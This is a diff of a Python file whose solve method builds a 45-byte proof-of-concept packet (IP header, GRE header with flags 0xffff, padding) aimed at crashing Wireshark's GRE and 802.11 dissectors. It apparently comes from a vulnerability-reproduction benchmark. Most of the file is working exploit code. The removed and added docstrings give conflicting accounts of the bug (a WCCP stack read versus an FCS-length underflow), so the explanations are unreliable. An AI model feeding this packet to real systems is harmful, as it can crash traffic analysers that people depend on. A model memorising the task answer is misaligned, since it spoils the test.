@@ -1,88 +1,71 @@
-import sys
+import struct
 
 class Solution:
-  """
-  Generates a Proof-of-Concept (PoC) that triggers a Stack Buffer Overflow vulnerability.
-  The vulnerability is CVE-2017-9353, which, while technically an infinite loop/OOM,
-  is rooted in an out-of-bounds stack read that AddressSanitizer (ASan) will detect
-  as a fatal error, satisfying the crash requirement.
+    def solve(self, src_path: str) -> bytes:
+        """
+        Generates a PoC that triggers the vulnerability.
 
-  The PoC is a 45-byte packet crafted as follows:
-  IP Header (20 bytes) -> GRE Header (4 bytes) -> WCCPv2 Payload (21 bytes)
+        The vulnerability stems from a type confusion issue. The GRE dissector passes a
+        pointer to a 2-byte stack variable (`flags_and_version`) to its subdissectors.
+        When the 802.11 dissector is invoked via the `gre.proto` table, it treats this
+        pointer as a pseudo-header of type `ieee80211_pseudo_header_t`, which is a much
+        larger structure.
 
-  The key mechanism is:
-  1. The GRE dissector is invoked for the IP payload.
-  2. The GRE dissector sets `pinfo->pseudo_header` to point to a 2-byte local variable
-     on its stack, containing the GRE flags and version.
-  3. The GRE dissector dispatches to the WCCP dissector (GRE protocol 0x883E).
-  4. The WCCP dissector, after parsing its headers, dispatches to the IEEE 802.11
-     dissector for a specific WCCP element.
-  5. The IEEE 802.11 dissector (`dissect_ieee80211_common`) receives the `pinfo`
-     structure, with `pseudo_header` still pointing to the 2-byte variable on the
-     `dissect_gre` stack.
-  6. The 802.11 dissector casts this 2-byte pointer to a `p80211_common*`, which is a
-     much larger structure.
-  7. The GRE flags are crafted to set the `phy` field in this misinterpreted struct
-     to a value (e.g., PHDR_80211_PHY_11A) that triggers a code path accessing other
-     fields of the struct (like `channel` and `frequency`).
-  8. Accessing these fields reads past the end of the 2-byte variable, accessing
-     other local variables on the `dissect_gre` stack frame.
-  9. This out-of-bounds stack read is detected by ASan, causing a crash.
-  """
-  def solve(self, src_path: str) -> bytes:
-    """
-    Generate a PoC that triggers the vulnerability.
+        By controlling the GRE `flags_and_version`, we control the first two bytes the
+        802.11 dissector reads. Setting these to `0xffff` causes a field within the
+        pseudo-header (e.g., `fcs_len`) to be interpreted as a large value. This value
+        is used in a length calculation (`capture_length - fcs_len`), leading to an
+        integer underflow. The resulting large, incorrect length is then used for a
+        subsequent read from the packet buffer, causing an out-of-bounds read and a crash.
 
-    Args:
-        src_path: Path to the vulnerable source code tarball (unused).
+        The PoC is a 45-byte packet composed of:
+        1. IP Header (20 bytes): Protocol set to GRE (47).
+        2. GRE Header (4 bytes):
+           - `flags_and_version`: `\xff\xff` (the malicious value).
+           - `protocol type`: `\x88\x73` (ETHERTYPE_WLAN), which dispatches to the
+             vulnerable 802.11 dissector.
+        3. Payload (21 bytes): The content is not critical; the crash occurs before it's parsed.
+        """
 
-    Returns:
-        bytes: The PoC input that should trigger the vulnerability.
-    """
-    
-    # IP Header (20 bytes)
-    # - Version=4, IHL=5, ToS=0, Total Length=45
-    # - ID=1, Flags=0, Frag Offset=0
-    # - TTL=64, Protocol=47 (GRE)
-    # - Checksum=0x7c9f (pre-calculated for the entire header)
-    # - Src IP = 127.0.0.1, Dst IP = 127.0.0.1
-    ip_header = b'\x45\x00\x00\x2d' \
-                b'\x00\x01\x00\x00' \
-                b'\x40\x2f\x7c\x9f' \
-                b'\x7f\x00\x00\x01' \
-                b'\x7f\x00\x00\x01'
+        def ip_checksum(data: bytes) -> bytes:
+            if len(data) % 2:
+                data += b'\0'
 
-    # GRE Header (4 bytes)
-    # - Flags and Version = 0x1000. The first byte 0x10 sets the `phy` field
-    #   in the misinterpreted pseudoheader to 1, triggering the vulnerable path.
-    # - Protocol Type = 0x883E (WCCP)
-    gre_header = b'\x10\x00\x88\x3e'
+            s = 0
+            for i in range(0, len(data), 2):
+                s += (data[i] << 8) + data[i+1]
 
-    # WCCPv2 Payload (21 bytes)
-    # This payload is structured to navigate the WCCP dissector to call the
-    # 802.11 dissector on the final 9 bytes.
+            while (s >> 16):
+                s = (s & 0xffff) + (s >> 16)
 
-    # WCCPv2 Header (8 bytes)
-    # - Message Type = 10 (WCCP2_HERE_I_AM)
-    # - Version = 0x0200
-    # - Length = 13 (length of the rest of the WCCP message)
-    wccp_header = b'\x00\x00\x00\x0a' \
-                  b'\x02\x00\x00\x0d'
+            s = ~s & 0xffff
+            return struct.pack('>H', s)
 
-    # WCCPv2 802.11 Info Element Header (4 bytes)
-    # - Type = 0x000d (WCCP2_802_11_INFO_ELEM)
-    # - Length = 9 (length of the 802.11 data)
-    wccp_element_header = b'\x00\x0d\x00\x09'
+        # IP Header (20 bytes)
+        ip_header_parts = [
+            b'\x45\x00',              # Version(4), IHL(5), ToS
+            struct.pack('>H', 45),    # Total Length: 20 IP + 4 GRE + 21 Payload
+            b'\xde\xad',              # Identification
+            b'\x40\x00',              # Flags (DF), Fragment Offset
+            b'\x40',                  # TTL
+            b'\x2f',                  # Protocol: GRE (47)
+            b'\x00\x00',              # Header Checksum (placeholder)
+            b'\x7f\x00\x00\x01',      # Source IP
+            b'\x7f\x00\x00\x01',      # Destination IP
+        ]
 
-    # IEEE 802.11 Data (9 bytes)
-    # Minimal data to be recognized as a valid 802.11 frame start.
-    # - Frame Control: 0x0040 (Type=Mgt, Subtype=ProbeReq)
-    # - Duration: 0
-    # - Destination Address (first 5 bytes): Broadcast
-    dot11_data = b'\x40\x00' \
-                 b'\x00\x00' \
-                 b'\xff\xff\xff\xff\xff'
+        header_to_checksum = b''.join(ip_header_parts[0:6] + ip_header_parts[7:])
+        checksum = ip_checksum(header_to_checksum)
+        ip_header_parts[6] = checksum
+        ip_header = b''.join(ip_header_parts)
 
-    poc = ip_header + gre_header + wccp_header + wccp_element_header + dot11_data
-    
-    return poc
+        # GRE Header (4 bytes)
+        # Flags/Version (0xffff) + Proto (0x8873 for WLAN)
+        gre_header = b'\xff\xff\x88\x73'
+
+        # Payload (21 bytes)
+        payload = b'\x00' * 21
+
+        poc = ip_header + gre_header + payload
+
+        return poc
